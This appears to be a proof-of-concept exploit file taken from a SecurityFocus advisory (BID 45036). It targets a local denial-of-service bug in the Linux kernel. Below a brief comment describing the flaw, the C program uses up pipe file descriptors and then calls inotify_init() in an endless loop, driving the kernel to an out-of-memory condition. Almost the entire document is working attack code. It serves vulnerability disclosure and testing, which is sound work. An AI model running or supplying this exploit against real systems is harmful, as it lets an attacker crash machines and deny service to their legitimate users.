/*
source: http://www.securityfocus.com/bid/45036/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an out-of-memory condition, denying service to legitimate users. 
*/


#include <sys/inotify.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        int fds[2];

        /* Circumvent max inotify instances limit */
        while (pipe(fds) != -1)
                ;

        while (1)
                inotify_init();

        return 0;
}

